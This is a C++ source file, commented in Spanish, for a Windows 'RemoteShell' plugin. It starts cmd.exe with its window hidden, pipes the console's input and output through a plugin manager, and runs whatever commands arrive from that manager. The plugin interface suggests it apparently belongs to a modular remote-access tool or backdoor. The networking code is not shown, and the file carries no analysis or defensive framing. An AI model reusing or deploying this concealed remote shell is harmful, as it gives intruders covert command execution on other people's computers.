#include "remoteshell.h"
#include <stdio.h>

int RemoteShell::threadReader(register RemoteShell *_this){
    ulong exitCode;
    if(_this){
        printf("threadReader on\n");
        char* buffer;
        ulong dataSize = 0;
        //recivo la respuesta de la consola mientras no haya errores y la consola siga abierta
        _this->threadRuning = true;
        while(_this->threadRuning){
            if(_this->read(&buffer,&dataSize)){
                //printf("leido dataSize %x\n",(uint)dataSize);
                //Mando los datos
                if(dataSize){
                    printf("buffer %S\n",(char*)buffer);
                    _this->mgr->sendData(buffer,dataSize);
                    free(buffer);
                }else Sleep(10);
            }else _this->threadRuning = false;
            GetExitCodeProcess(_this->ProcessInformation.hProcess,&exitCode);
            if(exitCode != STILL_ACTIVE){
                _this->threadRuning = false;
                printf("cmd exit code: %x\n",(uint)exitCode);
            }
        }
        CloseHandle(_this->hReadPipe);
        CloseHandle(_this->StartupInfo.hStdOutput);
        CloseHandle(_this->StartupInfo.hStdInput);
        CloseHandle(_this->hWritePipe);
        printf("threadReader off\n");
    }
    return 0;
}

RemoteShell::RemoteShell(){
    mgr = null;
    hThreadReader = INVALID_HANDLE_VALUE;


    //Inicializamos a Zero
    ZeroMemory(&ProcessInformation,sizeof(ProcessInformation));
    ZeroMemory(&StartupInfo,sizeof(StartupInfo));

    //cojemos la configuracion actual de y le añadimos para que oculte la ventana y los handles
    GetStartupInfo(&StartupInfo);
    StartupInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow = SW_HIDE;

    open();
}

RemoteShell::~RemoteShell(){
    close();
    CloseHandle(hReadPipe);
    CloseHandle(StartupInfo.hStdOutput);
    CloseHandle(StartupInfo.hStdInput);
    CloseHandle(hWritePipe);
    Sleep(500);
}

bool RemoteShell::open(){
    SECURITY_ATTRIBUTES secAttr;
    bool Result = false;

    ZeroMemory(&secAttr,sizeof(secAttr));

    secAttr.bInheritHandle = true;
    secAttr.nLength = sizeof(secAttr);

    //Creamos los pipes
    if(!CreatePipe(&hReadPipe,&StartupInfo.hStdOutput,&secAttr,0x1000)
            | !CreatePipe(&StartupInfo.hStdInput,&hWritePipe,&secAttr,0)){
        printf("CreatePipe error %x\n",(uint)GetLastError());
    }
    //redirigimos la salida de error
    StartupInfo.hStdError = StartupInfo.hStdOutput;

    if(CreateProcess(0,(char*)"cmd /U /D",0,0,true,0,0,0,&StartupInfo,&ProcessInformation)){
        //Iniciamos el hilo de lectura
        hThreadReader = CreateThread(0,0,(LPTHREAD_START_ROUTINE)&threadReader,this,0,0);
        //Esperamos hasta que el proceso este preparado
        WaitForInputIdle(ProcessInformation.hProcess,INFINITE);
        printf("Shell Abierta\n");
    }else{
        printf("CreateProcess error %x\n",(uint)GetLastError());
    }

    return Result;
}

bool RemoteShell::close(){
    TerminateProcess(ProcessInformation.hProcess,0);
    threadRuning = false;
    Sleep(100);
    //WaitForSingleObject(hThreadReader,1000);
    //cierro la consola
    WaitForSingleObject(ProcessInformation.hProcess,1000);
    return TerminateThread(hThreadReader,0);
}

bool RemoteShell::read(char **buffer, ulong *dataSize){
    bool result = false;
    *dataSize = 0;

    result = PeekNamedPipe(hReadPipe,0,0,0,dataSize,0);
    if(*dataSize){
        *buffer = (char*)malloc(*dataSize+2);
        *((ushort*)(*buffer+*dataSize)) = (char)0;

        result = ReadFile(hReadPipe,*buffer,*dataSize,dataSize,0);
        *dataSize +=2;
        if(!result)printf("ReadFile error %i\n",(uint)GetLastError());
    }

    return result;
}

bool RemoteShell::write(char *buffer, ulong size){
    bool result = false;
    if(!threadRuning)open();
    printf("write %S\n",(wchar_t*)buffer);
    if(size){
        result = WriteFile(hWritePipe,buffer,size,&size,0);
    }

    return result;
}

const char *RemoteShell::getPluginName(){
    return "RemoteShell";
}

int RemoteShell::onReciveData(char *data, uint size){
    size += 2;
    char* tmpBuff = (char*)malloc(size);
    ZeroMemory(tmpBuff,size);
    memcpy(tmpBuff,data,size-2);

    bool result = !write(tmpBuff,size);
    free(tmpBuff);
    return result;
}

void RemoteShell::setPluginManager(pluginManagerInterface *mgr){
    this->mgr = mgr;
}

PluginInterface* getInterface(){
    return new RemoteShell();
}
